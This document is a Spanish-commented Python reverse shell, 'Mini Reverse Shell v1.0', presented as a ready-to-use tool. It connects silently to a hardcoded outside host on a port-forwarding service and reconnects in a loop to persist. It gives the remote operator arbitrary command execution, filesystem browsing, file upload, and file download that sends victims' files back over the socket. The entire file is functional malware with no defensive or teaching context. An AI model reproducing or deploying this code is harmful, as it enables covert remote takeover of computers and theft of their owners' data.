#!/usr/bin/env python3
"""
🔥 MINI-REVERSE SHELL CON FUNCIONES BÁSICAS
✅ Ejecutar comandos
✅ Transferir archivos (upload/download)
✅ Navegación de archivos
✅ Silencioso y persistente
"""

import socket
import os
import sys
import time
import json
import base64
import shlex
from pathlib import Path

# ===== CONFIGURACIÓN =====
HOST = "Astrazam-37147.portmap.host"
PORT = 37147
# =========================

class MiniReverseShell:
    def __init__(self, sock):
        self.sock = sock
        self.cwd = os.getcwd()
        self.home = os.path.expanduser("~")
        
    def send_prompt(self):
        """Enviar prompt con directorio actual"""
        rel_path = os.path.relpath(self.cwd, self.home)
        if rel_path.startswith(".."):
            display_path = self.cwd
        else:
            display_path = f"~/{rel_path}" if rel_path != "." else "~"
        
        prompt = f"\033[1;32m{os.getlogin()}@mini-shell\033[0m:\033[1;34m{display_path}\033[0m$ "
        self.sock.send(prompt.encode())
    
    def exec_command(self, cmd):
        """Ejecutar comando normal"""
        try:
            import subprocess
            result = subprocess.run(
                cmd,
                shell=True,
                cwd=self.cwd,
                capture_output=True,
                text=True,
                timeout=30
            )
            output = result.stdout + result.stderr
            return output if output else "[Comando ejecutado]\n"
        except Exception as e:
            return f"[Error] {str(e)}\n"
    
    def change_dir(self, path):
        """Cambiar directorio"""
        try:
            # Expandir ~
            if path.startswith("~"):
                path = os.path.expanduser(path)
            
            # Si es ruta relativa, hacerla absoluta respecto a cwd
            if not os.path.isabs(path):
                path = os.path.join(self.cwd, path)
            
            os.chdir(path)
            self.cwd = os.getcwd()
            return f"[OK] Directorio: {self.cwd}\n"
        except Exception as e:
            return f"[Error] {str(e)}\n"
    
    def list_files(self, path="."):
        """Listar archivos con detalles"""
        try:
            target = os.path.join(self.cwd, path) if path != "." else self.cwd
            files = []
            
            with os.scandir(target) as entries:
                for entry in entries:
                    stat = entry.stat()
                    perms = oct(stat.st_mode)[-3:]
                    size = self.human_size(stat.st_size)
                    time_str = time.strftime('%Y-%m-%d %H:%M', 
                                           time.localtime(stat.st_mtime))
                    
                    icon = "📁" if entry.is_dir() else "📄"
                    files.append(f"{icon} {perms} {size:>8} {time_str} {entry.name}")
            
            return "\n".join(files) + "\n" if files else "[Vacío]\n"
        except Exception as e:
            return f"[Error] {str(e)}\n"
    
    def human_size(self, size):
        """Convertir tamaño a formato legible"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024.0 or unit == 'GB':
                break
            size /= 1024.0
        return f"{size:.1f}{unit}"
    
    def upload_file(self, remote_path, content_b64):
        """Subir archivo al servidor"""
        try:
            content = base64.b64decode(content_b64.encode())
            
            # Asegurar ruta absoluta
            if not os.path.isabs(remote_path):
                remote_path = os.path.join(self.cwd, remote_path)
            
            # Crear directorios si no existen
            os.makedirs(os.path.dirname(remote_path), exist_ok=True)
            
            with open(remote_path, 'wb') as f:
                f.write(content)
            
            size = self.human_size(len(content))
            return f"[OK] Archivo guardado: {remote_path} ({size})\n"
        except Exception as e:
            return f"[Error] {str(e)}\n"
    
    def download_file(self, file_path):
        """Descargar archivo del servidor"""
        try:
            if not os.path.isabs(file_path):
                file_path = os.path.join(self.cwd, file_path)
            
            if not os.path.exists(file_path):
                return None, "[Error] Archivo no encontrado\n"
            
            with open(file_path, 'rb') as f:
                content = f.read()
            
            b64_content = base64.b64encode(content).decode()
            filename = os.path.basename(file_path)
            size = self.human_size(len(content))
            
            return b64_content, f"[OK] {filename} ({size})\n"
        except Exception as e:
            return None, f"[Error] {str(e)}\n"
    
    def get_file_info(self, path):
        """Obtener información de archivo"""
        try:
            if not os.path.isabs(path):
                path = os.path.join(self.cwd, path)
            
            stat = os.stat(path)
            info = {
                'name': os.path.basename(path),
                'path': path,
                'size': self.human_size(stat.st_size),
                'modified': time.ctime(stat.st_mtime),
                'permissions': oct(stat.st_mode)[-3:],
                'is_dir': os.path.isdir(path)
            }
            
            result = f"📊 Información de {info['name']}:\n"
            for key, value in info.items():
                result += f"  {key}: {value}\n"
            return result
        except Exception as e:
            return f"[Error] {str(e)}\n"
    
    def process_command(self, cmd_line):
        """Procesar línea de comando"""
        cmd_line = cmd_line.strip()
        if not cmd_line:
            return ""
        
        # Comandos especiales
        if cmd_line.lower() in ['exit', 'quit']:
            return None
        
        # CD - Cambiar directorio
        if cmd_line.startswith('cd '):
            return self.change_dir(cmd_line[3:])
        
        # LS - Listar archivos
        if cmd_line.startswith('ls'):
            args = cmd_line[2:].strip()
            return self.list_files(args if args else ".")
        
        # PWD - Mostrar directorio actual
        if cmd_line == 'pwd':
            return f"{self.cwd}\n"
        
        # UPLOAD - Subir archivo
        if cmd_line.startswith('upload '):
            parts = cmd_line[7:].split(' ', 1)
            if len(parts) != 2:
                return "[Error] Formato: upload <ruta_remota> <contenido_base64>\n"
            return self.upload_file(parts[0], parts[1])
        
        # DOWNLOAD - Descargar archivo
        if cmd_line.startswith('download '):
            file_path = cmd_line[9:].strip()
            content, msg = self.download_file(file_path)
            if content:
                # Enviar archivo en formato especial
                self.sock.send(f"[FILE_START]{file_path}[SEP]{content}[FILE_END]".encode())
                return msg
            return msg
        
        # INFO - Información de archivo
        if cmd_line.startswith('info '):
            return self.get_file_info(cmd_line[5:])
        
        # Comando normal del sistema
        return self.exec_command(cmd_line)
    
    def run(self):
        """Ejecutar shell"""
        welcome = f"""
╔══════════════════════════════════╗
║   MINI REVERSE SHELL v1.0        ║
╠══════════════════════════════════╣
║ • Comandos: ls, cd, pwd, info    ║
║ • Upload: upload ruta base64     ║
║ • Download: download ruta        ║
║ • Salir: exit                    ║
╚══════════════════════════════════╝
Directorio actual: {self.cwd}
        """
        self.sock.send(welcome.encode())
        
        while True:
            try:
                self.send_prompt()
                data = self.sock.recv(8192).decode().strip()
                
                if not data:
                    break
                
                result = self.process_command(data)
                
                if result is None:  # Comando exit
                    self.sock.send(b"\n[+] Saliendo...\n")
                    break
                
                if result:  # Solo enviar si hay resultado
                    self.sock.send(result.encode())
                    
            except Exception as e:
                self.sock.send(f"[Error interno] {str(e)}\n".encode())
                continue

def main():
    """Función principal con reconexión"""
    # Silenciar
    sys.stdout = sys.stderr = open(os.devnull, 'w')
    
    print("[+] Mini Reverse Shell iniciado")
    
    while True:
        try:
            sock = socket.socket()
            sock.settimeout(10)
            sock.connect((HOST, PORT))
            sock.settimeout(None)
            
            print(f"[+] Conectado a {HOST}:{PORT}")
            
            shell = MiniReverseShell(sock)
            shell.run()
            
            sock.close()
            print("[-] Conexión cerrada, reconectando...")
            time.sleep(3)
            
        except KeyboardInterrupt:
            print("\n[!] Interrumpido")
            break
        except Exception as e:
            print(f"[-] Error: {e}, reconectando...")
            time.sleep(5)

if __name__ == "__main__":
    main()
